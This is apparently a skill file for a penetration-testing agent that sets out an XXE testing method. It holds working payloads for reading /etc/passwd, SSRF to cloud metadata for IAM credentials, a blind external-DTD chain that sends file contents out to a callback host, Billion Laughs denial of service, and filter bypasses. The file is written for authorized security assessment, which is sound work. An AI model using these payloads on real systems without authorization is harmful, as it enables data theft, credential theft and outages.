---
name: xxe-testing
description: XML external entity injection for file read, SSRF, and DoS
origin: Vigil
vuln_class: xxe
---

# XXE Testing (XML External Entity Injection)

## When to Activate

- Application accepts XML input (SOAP, REST with XML, file upload)
- Content-Type `application/xml` or `text/xml` accepted
- File formats that use XML internally (DOCX, XLSX, SVG, XHTML)

## Tools

- `vigil assess kali exec -- curl ...` (send crafted XML — all target-facing curl must go through the kali exec wrapper; use `--technique XXE --probe-kind payload --phase consume-test --timeout 30` for XXE attempts)
- Burp Suite Repeater (craft XML payloads — then replay via kali exec for audit pipeline coverage)
- XXEinjector (run via `vigil assess kali exec --technique XXE --probe-kind payload --phase consume-test --timeout 300 -- ...`)
- OOB callbacks: verify readiness with `vigil oob status --json`, then `vigil oob mint` a nonce-tagged callback host (embed it in the external-DTD chain) and `vigil oob poll --client <name>` to correlate the hit — see §4 Blind XXE. This replaces reading the listener log by hand. Fall back to time-based detection when OOB is unavailable.

## Methodology

### 1. Identify XML Input Points

- [ ] API endpoints accepting XML body
- [ ] SOAP services
- [ ] File upload: SVG, DOCX, XLSX, XML config
- [ ] Change `Content-Type: application/json` to `application/xml` — test if accepted
- [ ] RSS/Atom feed import, SAML assertions

### 2. Classic XXE — File Read

- [ ] Basic entity:
      ```xml
      <?xml version="1.0"?>
      <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
      ]>
      <root>&xxe;</root>
      ```
- [ ] Windows: `file:///C:/windows/win.ini`
- [ ] PHP wrapper: `php://filter/convert.base64-encode/resource=/etc/passwd`
- [ ] Directory listing (Java): `file:///etc/` (may work on some parsers)

### 3. SSRF via XXE

- [ ] `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`
- [ ] Internal service probe: `http://localhost:8080/`, `http://internal-host/`
- [ ] Cloud metadata: AWS, GCP, Azure endpoints
- [ ] Port scan: observe error differences per port

### 4. Blind XXE — Out-of-Band

When the parser resolves entities but the result is not reflected, an external-DTD chain to a minted callback host both confirms the bug and exfiltrates file data. Mint the host first so the hit is self-correlating:

```bash
vigil oob status --json   # confirm readiness
vigil oob mint --technique xxe --target-url "https://target/api/import" --param body --probe-kind http
# -> dns   <prefix>-<token>.oob.example.com   (this is <NONCE_HOST> below)
```

- [ ] Parameter entity + external DTD (point at the minted host, served from your kali-side DTD):
      ```xml
      <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://<NONCE_HOST>/evil.dtd">
        %xxe;
      ]>
      ```
- [ ] External DTD (`evil.dtd`) — the read file is embedded as a subdomain label of the callback, so it lands in the correlated hit:
      ```xml
      <!ENTITY % file SYSTEM "file:///etc/hostname">
      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.<NONCE_HOST>/'>">
      %eval;
      %exfil;
      ```
- [ ] Correlate the callback instead of grepping the listener log:
      ```bash
      vigil oob poll --client <name> --json
      ```
      A non-empty `matched` entry for your nonce confirms blind XXE; the exfiltrated file content (e.g. the hostname) arrives as the left label of the matched callback host (`full_host`). For multi-line files (`/etc/passwd`) the in-URL `?d=%file;` form breaks on newlines — use the subdomain-label form for single-line secrets, or fall back to error-based/FTP exfil below.
- [ ] Error-based exfiltration: force parse error containing file data
- [ ] FTP-based exfiltration for multi-line files

### 5. Denial of Service

- [ ] Billion Laughs:
      ```xml
      <!ENTITY lol "lol">
      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
      ```
- [ ] Recursive entity expansion
- [ ] External entity pointing to `/dev/random` or large file

### 6. Bypass Techniques

- [ ] UTF-16 encoding: `<?xml version="1.0" encoding="UTF-16"?>`
- [ ] CDATA wrapping to exfiltrate XML-breaking characters
- [ ] XInclude: `<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" parse="text" href="file:///etc/passwd"/>`
- [ ] HTML entities instead of XML entities
- [ ] Content-Type switch: JSON → XML if parser auto-detects
- [ ] Nested ENTITY definitions to evade WAF patterns

### 7. SVG / Office File XXE

- [ ] Embed XXE in SVG uploaded as image
- [ ] Embed XXE in DOCX: modify `[Content_Types].xml` or embedded XML parts
- [ ] XLSX: inject in `xl/sharedStrings.xml`

## What to Record

- Endpoint and input vector (body, file upload, header)
- Payload used and data exfiltrated
- Blind vs reflected
- Out-of-band callback evidence from `vigil oob poll --client <name>` (the matched probe<->callback pair, including the exfiltrated label)
- Internal resources accessed (files, metadata, services) — confirming the OOB callback fires is not enough; you must show the **attacker outcome** (e.g., `/etc/passwd` contents were returned in the response or exfiltrated via OOB DTD chain, AWS IAM credentials were read from the metadata endpoint via SSRF-XXE chain, file read primitive was demonstrated on a meaningful secret file)
- Severity: Critical (file read/SSRF) or High (blind confirmed)
- Remediation: disable DTD processing, disable external entities, use JSON

## Extended Resources

- `agent/references/payloads/xxe-payloads.md` — file read, OOB/blind XXE, DoS, context-specific (SOAP, SVG, DOCX)
